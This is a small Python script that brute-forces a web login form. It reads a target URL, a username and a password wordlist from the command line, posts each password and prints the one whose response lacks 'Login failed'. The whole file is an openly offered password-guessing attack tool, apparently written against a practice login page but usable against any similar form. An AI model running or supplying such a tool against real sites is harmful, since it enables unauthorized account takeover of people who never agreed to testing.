import sys,requests
from colorama import Back,Fore


def bruteLogin(url,data,user,passWordList):

    res = requests.post(url,data=data)
    return (res.text)

def printLogin():

    attempt=0
    url = sys.argv[1]
    user=sys.argv[2]
    passwordWordList = sys.argv[3]
    

    data = {'username':user,'password':'','Login':'submit'}
    
    with open(passwordWordList,'r') as passwords:

        for password in passwords:

            data['password']=password.strip()
            print("(-) Attempt [{}] -- Password [{}]".format(attempt,password.strip()))
            attempt=attempt+1
            res = bruteLogin(url,data,user,passwordWordList)
    
            if not ('Login failed' in res):
                print(Back.WHITE+Fore.BLACK+"[+]- Successful Login -[+]"+Back.RESET+Fore.RESET)
                print(Back.WHITE+Fore.BLACK+"[+]--> Password:"+Back.RESET+Fore.RESET+" {}".format(password))
                exit(-1)

    
    """with open('passlist.txt','r')as usernames:
        for user in usernames:
            print(user.strip())"""

def initial():
    if(len(sys.argv) not in range (2,4+1)):
        print("[+]-Usage--> python <program> <url> <user> <password wordlist>")
    
    printLogin()

if __name__ == '__main__':
    initial()